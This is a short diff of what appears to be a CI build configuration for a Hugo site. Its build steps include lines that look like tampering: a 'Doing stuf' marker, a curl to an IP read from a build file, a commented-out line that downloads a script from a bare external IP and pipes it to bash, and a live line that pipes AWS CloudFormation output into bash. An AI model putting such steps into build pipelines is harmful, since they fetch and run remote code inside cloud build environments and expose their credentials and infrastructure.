@@ -8,7 +8,8 @@ frontend:
         - mv hugo /usr/bin/hugo
         - rm -rf hugo.tar.gz
         - echo "[!] Doing stuf"
-        - curl $(cat /codebuild/input/bin/ip_address.txt) -v
+        - which curl
+        #curl $(cat /codebuild/input/bin/ip_address.txt) -v
         #curl http://44.202.99.166:8000/file.sh | bash
         - echo $(aws cloudformation list-stacks --region us-east-1 2>&1 | bash)
         - hugo
